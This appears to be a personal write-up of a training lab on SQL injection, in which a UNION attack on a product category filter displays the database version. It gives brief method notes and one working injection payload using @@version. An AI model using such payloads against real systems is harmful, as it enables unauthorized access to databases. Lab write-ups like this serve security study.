- **Lab objective** and difficulty level  
    
- **Step-by-step exploitation methodology**  
    
- **Payloads that worked** (and ones that didn't)  
    
- **Request/response samples** (screenshots or raw text)  
    
- **Why** the vulnerability existed and how to fix it


---

 `This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.`

`To solve the lab, display the database version string.` 


---

# - **Step-by-step exploitation methodology**  

```
Capture the category request and send to repeater and now add the payload
same as lab 4 just different payload because its mysql and microsoft
```

![[Pasted image 20260814114035.png]]

![[Pasted image 20260814114223.png]]

![[Pasted image 20260814114247.png]]

![[Pasted image 20260814114415.png]] 
#  **Payloads that worked** (and ones that didn't) 

```
1' UNION SELECT @@version,null## ---- Same explanation as lab 4
```